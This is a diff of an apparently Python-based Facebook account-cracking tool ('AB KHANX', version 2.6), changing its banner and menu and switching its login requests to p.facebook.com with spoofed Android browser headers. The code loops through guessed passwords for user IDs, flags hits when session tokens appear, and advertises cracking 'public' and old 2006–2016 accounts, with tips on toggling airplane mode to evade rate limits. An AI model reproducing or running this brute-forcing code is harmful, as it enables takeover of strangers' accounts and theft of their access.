@@ -380,20 +380,20 @@ def follow(ses,coki):
  
 logo = """\033[1;32m
      
-           ##     ##     ######      ######  
-           ###   ###    ##    ##    ##    ## 
-           #### ####    ##          ##       
-           ## ### ##     ######      ######  
-           ##     ##          ##          ## 
-           ##     ##    ##    ##    ##    ## 
-           ##     ##     ######      ######  
+          ##     ##     ######      ######  
+          ###   ###    ##    ##    ##    ## 
+          #### ####    ##          ##       
+          ## ### ##     ######      ######  
+          ##     ##          ##          ## 
+          ##     ##    ##    ##    ##    ## 
+          ##     ##     ######      ######  
 --------------------------------------------------
-\033[1;39m━▷ \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m AB KHANX
-\033[1;39m━▷ \033[0;91m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m◈✙◈ \033[1;32mMSS TRICKS
-\033[1;39m━▷ \033[0;91m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m◈✙◈ \033[1;33mAB KHANX
-\033[1;39m━▷ \033[0;91m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;34mMSS TRICKS HOME
-\033[1;39m━▷ \033[0;91m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m◈✙◈ \033[0;92mFREE AND ENJOY
-\033[1;39m━▷ \033[0;91m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;31m2.5
+\033[1;37m━▷ \033[0;37m𝙊𝙒𝙉𝙀𝙍       \033[1;37m◈✙◈   \033[1;337m AB KHANX
+\033[1;37m━▷ \033[0;37m𝙔𝙊𝙐𝙏𝙐𝘽𝙀     \033[1;39m◈✙◈    \033[1;37mMSS TRICKS
+\033[1;37m━▷ \033[0;37m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆    \033[1;39m◈✙◈    \033[1;37mAB KHANX
+\033[1;37m━▷ \033[0;37m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋    \033[1;39m◈✙◈    \033[1;37mSWATI KI TRICKS
+\033[1;37m━▷ \033[0;37m𝙎𝘼𝙏𝙐𝙏𝘼𝙎     \033[1;39m◈✙◈    \033[0;97mFREE AND ENJOY
+\033[1;37m━▷ \033[0;37m𝙑𝙀𝙍𝙎𝙄𝙊𝙉     \033[1;37m◈✙◈    \033[1;37m2.6
 --------------------------------------------------"""
  
 class Main:
@@ -405,9 +405,9 @@ class Main:
 		os.system("clear")
 		print(logo)
 		
-		print("\033[1;33m     ●▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[1;33m●▬▬▬▬▬▬▬▬▬▬▬▬●")
+		print("\033[1;33m----------------------------------------------------------------------------------------------------")
 		print("\033[1;37m     FIRST OF ALL SUBSCRIBE MY CHANNEL")
-		print("\033[1;33m     ●▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[1;33m●▬▬▬▬▬▬▬▬▬▬▬▬●")
+		print("\033[1;33m--------------------------------------------------")
 		
 		print(" \033[1;39m━▷\033[1;32m [1] SUBSCRIBE THE CHANNEL FOR APPROVED")
 		print(" \033[1;39m━▷\033[1;31m [2] Exit")
@@ -433,12 +433,12 @@ class Main:
 			os.system("clear")
 		print(logo)
 		print(" \033[1;37m[▪]Select Option")
-		print("\033[0;90m \033[1;33m●▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[1;33m●▬▬▬▬▬▬▬▬▬▬▬●")
-		print(" \033[1;39m━▷ \033[1;31m【1】 \033[1;36mBest Crack File Cloning\033[0;92m   ✓ (Best)")
-		print(" \033[1;39m━▷ \033[1;32m【2】 \033[1;34mCrack Public Id's")
-		print(" \033[1;39m━▷ \033[1;33m【3】 \033[1;33mFacebook Group help ")
-		print(" \033[1;39m━▷ \033[1;34m【4】 \033[1;32mOld Cloning Id's 2006-10 \033[0;92m ✓ (Best)")
-		print(" \033[1;39m━▷ \033[1;35m【5】 \033[1;37mOld Cloning Id's 2011-16\033[0;92m  ✓ (Best) ")
+		print("\033[0;90m\033[1;33m--------------------------------------------------")
+		print(" \033[1;39m━▷ \033[1;31m【1】 \033[1;36mF!!L3 CL0N!!NG")
+		print(" \033[1;39m━▷ \033[1;32m【2】 \033[1;34mPUBL!!!C !!!DX")
+		print(" \033[1;39m━▷ \033[1;33m【3】 \033[1;33mF4C3B00K GR00P")
+		print(" \033[1;39m━▷ \033[1;34m【4】 \033[1;32m0LD 2009 !!!DX")
+		print(" \033[1;39m━▷ \033[1;35m【5】 \033[1;37m0LD 2009 T0 11")
 		print(" \033[1;39m━▷ \033[0;91m【E】 Exit \n")
 		MAINUL =input(" \033[1;35mChoice : ")
 		if MAINUL in ["1", "01"]:
@@ -482,11 +482,10 @@ class Main:
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[1;32m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("     \033[1;32m   FREE MODE ACTIVATE")
-				print("\n\033[1;32m [+] CRACK HAS BEEN ED")
-				print(" \033[1;37m[+] Note: Ok Open 70% JUST NOW")
-				print(" [!] IF NO RESULT USE AIRPLANE MODE ON & OFF 5 SECONDS")
-				print("\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●")
+				print("\n\033[1;32m [+] CRACK HAS BEEN STARTED")
+				print(" \033[1;37m[+] OK OPEN 70% JUST NOW")
+				print(" [!] OFF ON AIRPLANE MODE")
+				print("\033[0;95m--------------------------------------------------")
 				print("\n")
 				print("\033[0;97m")
 				for user in self.id:
@@ -865,25 +864,25 @@ class Main:
 		for pw in pwx:
 			pw = pw.lower()
 			ses = requests.Session()
-			header_freefb = {'authority': 'x.facebook.com',
-    'method': 'GET',
-    'scheme': 'https',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
-    'cache-control': 'max-age=0',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
-			response = requests.get('https://x.facebook.com/', cookies=cookies, headers=headers)
+			header_freefb = {'authority': 'p.facebook.com',
+            'method': 'GET',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
+            'cache-control': 'max-age=0',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+			response = requests.get('https://p.facebook.com/', cookies=cookies, headers=headers)
 			if "session_key" in response.text and "EAA" in response.text:
 				print("\r \033[0;92m[SWATI-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
@@ -1304,25 +1303,25 @@ class Main:
 		for pw in pwx:
 			pw = pw.lower()
 			ses = requests.Session()
-			header_freefb = {'authority': 'x.facebook.com',
-    'method': 'GET',
-    'scheme': 'https',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
-    'cache-control': 'max-age=0',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
-			response = requests.get('https://x.facebook.com/', cookies=cookies, headers=headers)
+			header_freefb ={'authority': 'p.facebook.com',
+            'method': 'GET',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
+            'cache-control': 'max-age=0',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+			response = requests.get('https://p.facebook.com/', cookies=cookies, headers=headers)
 			if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[0;92m[SWATI-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
